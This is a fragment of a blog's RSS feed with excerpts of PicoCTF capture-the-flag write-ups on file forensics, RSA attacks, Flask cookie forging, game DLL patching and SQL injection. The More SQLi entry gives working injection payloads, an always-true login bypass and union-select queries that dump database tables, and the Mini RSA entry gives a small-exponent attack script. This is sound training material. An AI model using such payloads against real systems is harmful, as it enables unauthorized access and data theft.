&lt;img src="https://i.imgur.com/C0xk8YL.png" alt="" />&lt;/p></description></item><item><title>PicoCTF - MacroHard WeakEdge</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/general/picoctf---macrohard-weakedge/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/general/picoctf---macrohard-weakedge/</guid><description>&lt;h1 id="picoctf---macrohard-weakedge">
 PicoCTF - MacroHard WeakEdge
 &lt;a class="anchor" href="#picoctf---macrohard-weakedge">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-misc">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Misc&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-misc">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/130?bookmarked=0&amp;amp;category=4&amp;amp;page=1&amp;amp;search=&amp;amp;solved=0">MacroHard WeakEdge&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://fileinfo.com/extension/pptm">What is a PPTM file?&lt;/a>
&lt;font color="FF0000">It&amp;rsquo;s a zip format file&lt;/font>&lt;/p>
&lt;blockquote>
&lt;p>A PPTM file is a macro-enabled presentation created by Microsoft PowerPoint, an application used to create presentations and slide shows. It contains a collection of slides, which typically includes text, layout, images, and embedded macros. PPTM files are commonly used to store business, marketing, and academic presentations.&lt;/p></description></item><item><title>PicoCTF - Matryoshka doll</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/general/picoctf---matryoshka-doll/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/general/picoctf---matryoshka-doll/</guid><description>&lt;h1 id="picoctf---matryoshka-doll">
 PicoCTF - Matryoshka doll
 &lt;a class="anchor" href="#picoctf---matryoshka-doll">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-misc">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Misc&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-misc">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/129?category=4&amp;amp;page=1">&lt;/a>&lt;/p>
&lt;h2 id="exploit---rar-in-rar">
 Exploit - &lt;code>rar&lt;/code> in &lt;code>rar&lt;/code>
 &lt;a class="anchor" href="#exploit---rar-in-rar">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Hint
The hint said:&lt;/p>
&lt;blockquote>
&lt;p>Wait, you can hide files inside files? But how do you find them?&lt;/p>&lt;/blockquote>
&lt;p>So&amp;hellip;I tried &lt;code>stegsolve&lt;/code>, &lt;code>HxD&lt;/code>, &lt;code>exiftool&lt;/code>, &lt;code>string dolls.jpg | grep &amp;quot;{&amp;quot;&lt;/code>, &lt;code>$ zsteg dolls.jpg&lt;/code> &amp;hellip; All these are in vain&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;font color="FF0000">通靈&lt;/font>: Changed the extension to &lt;code>.rar&lt;/code>
And it can be uncompressed
&lt;img src="https://i.imgur.com/sNfhE2J.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Repeat until find &lt;code>flag.txt&lt;/code>&amp;hellip;&lt;/p></description></item><item><title>PicoCTF - Mind your Ps and Qs</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/rsa/picoctf---mind-your-ps-and-qs/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/rsa/picoctf---mind-your-ps-and-qs/</guid><description>&lt;h1 id="picoctf---mind-your-ps-and-qs">
 PicoCTF - Mind your Ps and Qs
 &lt;a class="anchor" href="#picoctf---mind-your-ps-and-qs">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-crypto">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Crypto&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-crypto">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/162?category=2&amp;amp;page=1">Mind your Ps and Qs&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://ithelp.ithome.com.tw/articles/10250721">RSA (觀念篇) &lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-txt" data-lang="txt">&lt;span style="display:flex;">&lt;span>Decrypt my super sick RSA:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c: 421345306292040663864066688931456845278496274597031632020995583473619804626233684
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>n: 631371953793368771804570727896887140714495090919073481680274581226742748040342637
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>e: 65537
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="exploit---find-p--q-by-online-tool">
 Exploit - Find P &amp;amp; Q By &lt;a href="https://www.alpertron.com/ECM.HTM">Online Tool&lt;/a>
 &lt;a class="anchor" href="#exploit---find-p--q-by-online-tool">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Find P &amp;amp; Q
Use online tool to do prime factorize on &lt;code>n&lt;/code>
p $\to$ 1461849912200000206276283741896701133693
q $\to$ 431899300006243611356963607089521499045809&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Write exploit&lt;/p></description></item><item><title>PicoCTF - Mini RSA</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/rsa/picoctf---mini-rsa/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/rsa/picoctf---mini-rsa/</guid><description>&lt;h1 id="picoctf---mini-rsa">
 PicoCTF - Mini RSA
 &lt;a class="anchor" href="#picoctf---mini-rsa">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-crypto">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Crypto&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-crypto">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/188?category=2&amp;amp;page=1">Mini RSA&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>N: &lt;span style="color:#ae81ff">1615765684321463054078226051959887884233678317734892901740763321135213636796075462401950274602405095138589898087428337758445013281488966866073355710771864671726991918706558071231266976427184673800225254531695928541272546385146495736420261815693810544589811104967829354461491178200126099661909654163542661541699404839644035177445092988952614918424317082380174383819025585076206641993479326576180793544321194357018916215113009742654408597083724508169216182008449693917227497813165444372201517541788989925461711067825681947947471001390843774746442699739386923285801022685451221261010798837646928092277556198145662924691803032880040492762442561497760689933601781401617086600593482127465655390841361154025890679757514060456103104199255917164678161972735858939464790960448345988941481499050248673128656508055285037090026439683847266536283160142071643015434813473463469733112182328678706702116054036618277506997666534567846763938692335069955755244438415377933440029498378955355877502743215305768814857864433151287&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>e: &lt;span style="color:#ae81ff">3&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ciphertext &lt;span style="color:#f92672">(&lt;/span>c&lt;span style="color:#f92672">)&lt;/span>: &lt;span style="color:#ae81ff">1220012318588871886132524757898884422174534558055593713309088304910273991073554732659977133980685370899257850121970812405700793710546674062154237544840177616746805668666317481140872605653768484867292138139949076102907399831998827567645230986345455915692863094364797526497302082734955903755050638155202890599808147130204332030239454609548193370732857240300019596815816006860639254992255194738107991811397196500685989396810773222940007523267032630601449381770324467476670441511297695830038371195786166055669921467988355155696963689199852044947912413082022187178952733134865103084455914904057821890898745653261258346107276390058792338949223415878232277034434046142510780902482500716765933896331360282637705554071922268580430157241598567522324772752885039646885713317810775113741411461898837845999905524246804112266440620557624165618470709586812253893125417659761396612984740891016230905299327084673080946823376058367658665796414168107502482827882764000030048859751949099453053128663379477059252309685864790106&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="exploit---small-e-attack">
 Exploit - Small &lt;code>e&lt;/code> attack
 &lt;a class="anchor" href="#exploit---small-e-attack">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">import gmpy2
from Crypto.Util.number import long_to_bytes


N = 1615765684321463054078226051959887884233678317734892901740763321135213636796075462401950274602405095138589898087428337758445013281488966866073355710771864671726991918706558071231266976427184673800225254531695928541272546385146495736420261815693810544589811104967829354461491178200126099661909654163542661541699404839644035177445092988952614918424317082380174383819025585076206641993479326576180793544321194357018916215113009742654408597083724508169216182008449693917227497813165444372201517541788989925461711067825681947947471001390843774746442699739386923285801022685451221261010798837646928092277556198145662924691803032880040492762442561497760689933601781401617086600593482127465655390841361154025890679757514060456103104199255917164678161972735858939464790960448345988941481499050248673128656508055285037090026439683847266536283160142071643015434813473463469733112182328678706702116054036618277506997666534567846763938692335069955755244438415377933440029498378955355877502743215305768814857864433151287
e = 3
c = 1220012318588871886132524757898884422174534558055593713309088304910273991073554732659977133980685370899257850121970812405700793710546674062154237544840177616746805668666317481140872605653768484867292138139949076102907399831998827567645230986345455915692863094364797526497302082734955903755050638155202890599808147130204332030239454609548193370732857240300019596815816006860639254992255194738107991811397196500685989396810773222940007523267032630601449381770324467476670441511297695830038371195786166055669921467988355155696963689199852044947912413082022187178952733134865103084455914904057821890898745653261258346107276390058792338949223415878232277034434046142510780902482500716765933896331360282637705554071922268580430157241598567522324772752885039646885713317810775113741411461898837845999905524246804112266440620557624165618470709586812253893125417659761396612984740891016230905299327084673080946823376058367658665796414168107502482827882764000030048859751949099453053128663379477059252309685864790106

k = 1
while True:
 if gmpy2.iroot(c + N * k, 3)[1]==1:
 res=gmpy2.iroot(c + N * k, 3)[0] 
 print(k, res)
 print(long_to_bytes(res))
 break
 k += 1
&lt;/code>&lt;/pre>&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://zhuanlan.zhihu.com/p/76228394">CTF_RSA解密学习指南(三) - e=3 小明文攻击&lt;/a>&lt;/p></description></item><item><title>PicoCTF - More SQLi</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---more-sqli/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---more-sqli/</guid><description>&lt;h1 id="picoctf---more-sqli">
 PicoCTF - More SQLi
 &lt;a class="anchor" href="#picoctf---more-sqli">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://lab.feifei.tw/practice/sqli/sql4.php">Feifei Lab&lt;/a>&lt;/li>
&lt;li>Hint SQLiLite&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>先隨便輸入發現他很貼心有給完整的payload，發現他是先檢查password，在沒有任何防護的情況下，直接用最經典的payload就可了
Account: Any
Password: &lt;code>' or '1'='1' -- #&lt;/code>
&lt;img src="https://hackmd.io/_uploads/rJXd-oLd3.png" alt="" />&lt;/p>
&lt;hr>
&lt;p>&lt;img src="https://hackmd.io/_uploads/Bki0WoLd3.png" alt="" />&lt;/p>
&lt;h2 id="exploit---sqliunion-selection">
 Exploit - SQLi(Union Selection)
 &lt;a class="anchor" href="#exploit---sqliunion-selection">#&lt;/a>
&lt;/h2>
&lt;p>現在的目標是flag應該是藏在別的table，所以先找甚麼table&lt;/p>
&lt;ol>
&lt;li>
&lt;p>找table
透過&lt;a href="https://github.com/w181496/Web-CTF-Cheatsheet#sqlite">Kaibro的cheat sheet&lt;/a>，SQLite的爆破payload是&lt;code>SELECT name FROM sqlite_master WHERE type='table'&lt;/code>，而目前我們可以用union based的方式搜尋，先觀察搜尋&lt;code>Algiers&lt;/code>的搜尋column有三個，第一個column是chr，第二個column是chr，第三個是int，所以在用union select的時候要遵守&lt;font color="FF0000">&lt;strong>查詢數量一樣、每個欄位的型態一樣&lt;/strong>&lt;/font>
Payload: &lt;code>Algiers' union SELECT sql,sql,1 FROM sqlite_master WHERE type='table'; --&lt;/code>
:::spoiler Screenshot
&lt;img src="https://hackmd.io/_uploads/rk9G4oLO2.png" alt="" />
:::&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Find Flag - Union based
目前發現有兩個table比較可疑&lt;/p>
&lt;ul>
&lt;li>CREATE TABLE hints (id INTEGER NOT NULL PRIMARY KEY, info TEXT)&lt;/li>
&lt;li>CREATE TABLE more_table (id INTEGER NOT NULL PRIMARY KEY, flag TEXT)&lt;/li>
&lt;/ul>
&lt;p>可以直接用前面同樣的方式找flag，觀察這個table只有兩個column，且一個column的type是int，另外一個是text，而第三個column就隨便填
Payload: &lt;code>Algiers' union SELECT id,flag,1 FROM more_table; --&lt;/code>
:::spoiler Screenshot
&lt;img src="https://hackmd.io/_uploads/ryonEoIdn.png" alt="" />
:::
Flag: &lt;code>picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_98236ce6}&lt;/code>&lt;/p></description></item><item><title>PicoCTF - Most Cookies</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---most-cookies/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---most-cookies/</guid><description>&lt;h1 id="picoctf---most-cookies">
 PicoCTF - Most Cookies
 &lt;a class="anchor" href="#picoctf---most-cookies">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-web">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://vocus.cc/article/634c1c7efd89780001237de9">Python Flask session 學習心得&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>在Flask將資料儲存在session這個object裡面時，可看成是儲存在client端，因為資料其實是存在web server，每次新增內容到session就會新增一個新的cookie(cryptographically-signed cookies)，並透過secret_key做簽章。需注意的是這所謂的「secret_key」並不是用於加密(切勿儲存機密資料)，而是用來做數位簽章確認資料的完整性，簡單說是每個人都可以知道cookie裡面的資料，但只有server知道cookie是否被串改，如果被串改就無法登入該帳戶。&lt;/p>&lt;/blockquote>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session
import random
app = Flask(__name__)
flag_value = open(&amp;#34;./flag&amp;#34;).read().rstrip()
title = &amp;#34;Most Cookies&amp;#34;
cookie_names = [&amp;#34;snickerdoodle&amp;#34;, &amp;#34;chocolate chip&amp;#34;, &amp;#34;oatmeal raisin&amp;#34;, &amp;#34;gingersnap&amp;#34;, &amp;#34;shortbread&amp;#34;, &amp;#34;peanut butter&amp;#34;, &amp;#34;whoopie pie&amp;#34;, &amp;#34;sugar&amp;#34;, &amp;#34;molasses&amp;#34;, &amp;#34;kiss&amp;#34;, &amp;#34;biscotti&amp;#34;, &amp;#34;butter&amp;#34;, &amp;#34;spritz&amp;#34;, &amp;#34;snowball&amp;#34;, &amp;#34;drop&amp;#34;, &amp;#34;thumbprint&amp;#34;, &amp;#34;pinwheel&amp;#34;, &amp;#34;wafer&amp;#34;, &amp;#34;macaroon&amp;#34;, &amp;#34;fortune&amp;#34;, &amp;#34;crinkle&amp;#34;, &amp;#34;icebox&amp;#34;, &amp;#34;gingerbread&amp;#34;, &amp;#34;tassie&amp;#34;, &amp;#34;lebkuchen&amp;#34;, &amp;#34;macaron&amp;#34;, &amp;#34;black and white&amp;#34;, &amp;#34;white chocolate macadamia&amp;#34;]
app.secret_key = random.choice(cookie_names)

@app.route(&amp;#34;/&amp;#34;)
def main():
	if session.get(&amp;#34;very_auth&amp;#34;):
		check = session[&amp;#34;very_auth&amp;#34;]
		if check == &amp;#34;blank&amp;#34;:
			return render_template(&amp;#34;index.html&amp;#34;, title=title)
		else:
			return make_response(redirect(&amp;#34;/display&amp;#34;))
	else:
		resp = make_response(redirect(&amp;#34;/&amp;#34;))
		session[&amp;#34;very_auth&amp;#34;] = &amp;#34;blank&amp;#34;
		return resp

@app.route(&amp;#34;/search&amp;#34;, methods=[&amp;#34;GET&amp;#34;, &amp;#34;POST&amp;#34;])
def search():
	if &amp;#34;name&amp;#34; in request.form and request.form[&amp;#34;name&amp;#34;] in cookie_names:
		resp = make_response(redirect(&amp;#34;/display&amp;#34;))
		session[&amp;#34;very_auth&amp;#34;] = request.form[&amp;#34;name&amp;#34;]
		return resp
	else:
		message = &amp;#34;That doesn&amp;#39;t appear to be a valid cookie.&amp;#34;
		category = &amp;#34;danger&amp;#34;
		flash(message, category)
		resp = make_response(redirect(&amp;#34;/&amp;#34;))
		session[&amp;#34;very_auth&amp;#34;] = &amp;#34;blank&amp;#34;
		return resp

@app.route(&amp;#34;/reset&amp;#34;)
def reset():
	resp = make_response(redirect(&amp;#34;/&amp;#34;))
	session.pop(&amp;#34;very_auth&amp;#34;, None)
	return resp

@app.route(&amp;#34;/display&amp;#34;, methods=[&amp;#34;GET&amp;#34;])
def flag():
	if session.get(&amp;#34;very_auth&amp;#34;):
		check = session[&amp;#34;very_auth&amp;#34;]
		if check == &amp;#34;admin&amp;#34;:
			resp = make_response(render_template(&amp;#34;flag.html&amp;#34;, value=flag_value, title=title))
			return resp
		flash(&amp;#34;That is a cookie! Not very special though...&amp;#34;, &amp;#34;success&amp;#34;)
		return render_template(&amp;#34;not-flag.html&amp;#34;, title=title, cookie_name=session[&amp;#34;very_auth&amp;#34;])
	else:
		resp = make_response(redirect(&amp;#34;/&amp;#34;))
		session[&amp;#34;very_auth&amp;#34;] = &amp;#34;blank&amp;#34;
		return resp

if __name__ == &amp;#34;__main__&amp;#34;:
	app.run()
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - mus1c</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/general-skills/picoctf---mus1c/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/general-skills/picoctf---mus1c/</guid><description>&lt;h1 id="picoctf---mus1c">
 PicoCTF - mus1c
 &lt;a class="anchor" href="#picoctf---mus1c">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-general-skill">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>General Skill&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-general-skill">#&lt;/a>
&lt;/h6>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Lyrics&lt;/p>
&lt;pre tabindex="0">&lt;code>Pico&amp;#39;s a CTFFFFFFF
my mind is waitin
It&amp;#39;s waitin

Put my mind of Pico into This
my flag is not found
put This into my flag
put my flag into Pico


shout Pico
shout Pico
shout Pico

My song&amp;#39;s something
put Pico into This

Knock This down, down, down
put This into CTF

shout CTF
my lyric is nothing
Put This without my song into my lyric
Knock my lyric down, down, down

shout my lyric

Put my lyric into This
Put my song with This into my lyric
Knock my lyric down

shout my lyric

Build my lyric up, up ,up

shout my lyric
shout Pico
shout It

Pico CTF is fun
security is important
Fun is fun
Put security with fun into Pico CTF
Build Fun up
shout fun times Pico CTF
put fun times Pico CTF into my song

build it up

shout it
shout it

build it up, up
shout it
shout Pico
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - New Caesar</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/classic/picoctf---new-caesar/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/classic/picoctf---new-caesar/</guid><description>&lt;h1 id="picoctf---new-caesar">
 PicoCTF - New Caesar
 &lt;a class="anchor" href="#picoctf---new-caesar">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-crypto">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Crypto&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-crypto">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/158?category=2&amp;amp;page=1">New Caesar&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>::: spoiler source code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">import string

LOWERCASE_OFFSET = ord(&amp;#34;a&amp;#34;)
ALPHABET = string.ascii_lowercase[:16]

def b16_encode(plain):
	enc = &amp;#34;&amp;#34;
	for c in plain:
		binary = &amp;#34;{0:08b}&amp;#34;.format(ord(c))
		enc += ALPHABET[int(binary[:4], 2)]
		enc += ALPHABET[int(binary[4:], 2)]
	return enc

def shift(c, k):
	t1 = ord(c) - LOWERCASE_OFFSET
	t2 = ord(k) - LOWERCASE_OFFSET
	return ALPHABET[(t1 + t2) % len(ALPHABET)]

flag = &amp;#34;redacted&amp;#34;
key = &amp;#34;redacted&amp;#34;
assert all([k in ALPHABET for k in key])
assert len(key) == 1

b16 = b16_encode(flag)
enc = &amp;#34;&amp;#34;
for i, c in enumerate(b16):
	enc += shift(c, key[i % len(key)])
print(enc)
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - No Padding, No Problem</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/rsa/picoctf---no-padding-no-problem/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/rsa/picoctf---no-padding-no-problem/</guid><description>&lt;h1 id="picoctf---no-padding-no-problem">
 PicoCTF - No Padding, No Problem
 &lt;a class="anchor" href="#picoctf---no-padding-no-problem">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-crypto">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Crypto&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-crypto">#&lt;/a>
&lt;/h6>
&lt;h2 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h2>
&lt;p>Oracles can be your best friend, they will decrypt anything, except the flag&amp;rsquo;s ciphertext. How will you break it? Connect with nc mercury.picoctf.net 10333.&lt;/p>
&lt;h2 id="hint">
 Hint
 &lt;a class="anchor" href="#hint">#&lt;/a>
&lt;/h2>
&lt;p>What can you do with a different pair of ciphertext and plaintext? What if it is not so different after all&amp;hellip;&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>We can try to decrypt ciphertext directly.&lt;/p></description></item><item><title>PicoCTF - No way out</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---no-way-out/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---no-way-out/</guid><description>&lt;h1 id="picoctf---no-way-out">
 PicoCTF - No way out
 &lt;a class="anchor" href="#picoctf---no-way-out">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>C Sharp / dn.spy / cheat engine&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>大概有三種解法，其中兩種是改變.dll中的內容，有點利用binary exploitation的方式顯示flag，另外一種就是利用cheat engine的方式找到儲存座標的memory然後手動改寫數值，就拿到flag&lt;/p>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;h3 id="method-1---change-dll">
 Method 1 - Change .dll
 &lt;a class="anchor" href="#method-1---change-dll">#&lt;/a>
&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>可以看到&lt;code>No way out/pico_Data/Managed/Assembly-CSharp.dll&lt;/code>可能是一個可以用dn.spy decompile的文件，先看看有沒有甚麼可以更改的&lt;/p>
&lt;/li>
&lt;li>
&lt;p>在APTX class中，一個Mysterious的member，而且當&lt;code>collision.gameObject == this.player&lt;/code>是true的時候，&lt;code>this.Mysterious.SetActive(true);&lt;/code>就會被trigger，所以這就有點像是我們在遊戲中，如果要碰到白色旗子的時候會觸發的statement，那如果我在初始化的階段就直接把&lt;code>this.Mysterious.SetActive(true);&lt;/code>設定成true，是不是就可以直接拿直到flag?
&lt;img src="https://hackmd.io/_uploads/rylVM-rah.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Implementation
直接右鍵edit class變成多加一個Start() method，然後不用任何的條件就達到剛剛說的效果，切記一定要是Start，因為Start是有被實際呼叫的method，如果取個aaa這種名字，他本來就不會被呼叫，那改成這樣也沒意義，當然，也可以取其他會被呼叫到的method name，例如Update, Awake之類的
&lt;img src="https://hackmd.io/_uploads/rJ-UNZBp3.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://hackmd.io/_uploads/Hy_pE-HT2.png" alt="" />&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h3 id="method-2---change-dll">
 Method 2 - Change .dll
 &lt;a class="anchor" href="#method-2---change-dll">#&lt;/a>
&lt;/h3>
&lt;p>當然記得能改動.dll的method，我們也可以改變遊戲角色跳不過圍牆的問題，最直觀的作法是我可以直接無限制的往上跳，超過圍牆就抵達flag，不會只有跳一小段這個問題，可以查看一下&lt;code>EvolveGames/PlayerController/Update()&lt;/code>這個method，其中的第51行&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-csharp!" data-lang="csharp!">if (Input.GetButton(&amp;#34;Jump&amp;#34;) &amp;amp;&amp;amp; this.canMove &amp;amp;&amp;amp; this.characterController.isGrounded &amp;amp;&amp;amp; !this.isClimbing)
{
 this.moveDirection.y = this.jumpSpeed;
}
&lt;/code>&lt;/pre>&lt;p>如果改成&lt;/p></description></item><item><title>PicoCTF - not crypto</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---not-crypto/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---not-crypto/</guid><description>&lt;h1 id="picoctf---not-crypto">
 PicoCTF - not crypto
 &lt;a class="anchor" href="#picoctf---not-crypto">#&lt;/a>
&lt;/h1>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA Pseudo Source COde&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-clike!" data-lang="clike!">__int64 __fastcall main(int a1, char **a2, char **a3)
{
 __int128 *v4; // rax
 unsigned __int8 v5; // di
 unsigned __int8 v6; // si
 unsigned __int8 v7; // cl
 unsigned __int8 v8; // dl
 unsigned int v9; // r8d
 unsigned __int8 v10; // r11
 int v16; // eax
 __int64 v17; // rdx
 unsigned int v18; // r12d
 char *v20; // r15
 unsigned __int8 v25; // r8
 int v30; // esi
 unsigned __int8 v32; // r12
 unsigned __int8 v36; // r14
 unsigned __int8 v38; // dl
 unsigned __int8 v40; // cl
 char v42; // r12
 char v43; // r14
 char v44; // al
 __int64 v45; // r13
 unsigned __int8 v46; // r10
 unsigned __int8 v47; // bp
 unsigned __int8 v48; // bl
 unsigned __int8 v49; // r8
 unsigned __int8 v50; // r11
 char v51; // dl
 char v54; // r10
 __int64 v63; // rdx
 char v72; // al
 unsigned __int8 v84; // [rsp+Ah] [rbp-1FEh]
 unsigned __int8 v85; // [rsp+Bh] [rbp-1FDh]
 int v86; // [rsp+Ch] [rbp-1FCh]
 int v87; // [rsp+10h] [rbp-1F8h]
 unsigned __int8 v88; // [rsp+14h] [rbp-1F4h]
 unsigned __int8 v89; // [rsp+15h] [rbp-1F3h]
 unsigned __int8 v90; // [rsp+16h] [rbp-1F2h]
